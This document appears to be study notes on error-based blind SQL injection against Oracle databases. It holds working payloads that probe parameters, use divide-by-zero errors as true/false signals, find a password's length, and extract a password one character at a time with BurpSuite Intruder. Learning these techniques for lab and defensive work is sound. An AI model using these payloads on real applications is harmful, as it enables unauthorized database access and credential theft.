## Blind SQLi Techniques

## Error based SQLi

- No database rows are returned. If SQL query has error then error message is returned else nothing.
- We can use our custom payload to generate specific errors and use those errors to gain further info about the database and ask **true** and **false** questions instead of directly asking it.
- We need to use the errors as **true** and **false** statements accordingly.

### 1. Checking Parameter Vulnerability

```sql
'
''
/*
verify which one of the above payloads cause error and which payload makes it disappear. If there is error produced in one and the other produces none then we have a vulnerable parameter. Since its a conditional error based sqli so direct true false queries will not work since the wep app will not return any rows. 
*/
```

### 2. Testing Error Entries

```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
/*
the above payload will always result in error cuz 1=1 and 1 divide by 0 result is undefined.
*/

' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'-- 
/*
the above payload will not result in error cuz 1=2 is false and else part will get executed.
*/

/*
NOTE: this is for oracle databases so check the Cheatsheet of SQli to give database specific string concatenation and syntaxes.
*/
```

### 3. Checking User Entry

```sql
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--

/*
NOTE: For database specific string concatenation and syntaxes checkout the Cheatsheet of the SQli.
*/
```

### 4. Finding Password Length

- Increment the  `<value>` by `1` each time until you hit an error. So if at `19` you get error so the password length is 19.
- If `LENGTH(<password_column>) > <value>` is **true** then password length = current `<value>`. Check the last request.
- If `LENGTH(<password_column>) > <value>` is **false** then increment `<value>` by 1.

**TIP: Send this request to BurpSuite Intruder and then add payload in the `<value>` part and set Payload Type to Numbers and provide a starting and ending range. Then start the attack. Look for the last error request. The last error request will have the length of the password. So if the last request is `19` so password length = `19 + 1 = 20`.**

```sql
' AND (SELECT CASE WHEN LENGTH(<password_column>) > <value> THEN to_char(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
```

### 5. Bruteforcing Password

- **LOGIC**
	- This attack uses **Blind SQL Injection with BurpSuite Intruder** to extract sensitive data (e.g., password) one character at a time by checking conditions. The base payload structure is `SELECT item_name FROM Shop WHERE item_name='input'`
	- The payload is designed to extract a **single character from the password column** using the `SUBSTR()` function. It compares that character with a guessed value provided via BurpSuite payloads.
	
- **SETUP**
	- Use BurpSuite **CLUSTER BOMB ATTACK**.
	- **Payload 1 Configuration**
		- `§1§` is the **INDEX VALUE**.
		- `§1§` should contain numbers from 1 to **length of the password**.
		- `Payload Type -> Numbers`, `Start -> 1`, `End -> length of password`, `Step -> 1 `
		- Testing each character from the **payload 2** wordlist against each index of the password value.
		
	- **Payload 2 Configuration**
		- `§2§` is the **WORDLIST CHARACTER**.
		- `§2§` will contain one character each line. 
		- `Payload Type -> Bruteforcer` , `Character Set -> abcdefghijklmnopqrstuvwxyz0123456789`, `Min Length -> 1 Max Length -> 1`
		
- **WORKING**
	- If error is produced then **true** else **false**. It means if error then character matches index character value. Use the BurpSuite to look for these error requests.

```sql
' AND (SELECT CASE WHEN SUBSTR(<password_column>,§1§,1)='§2§' THEN to_char(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
```

---
## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)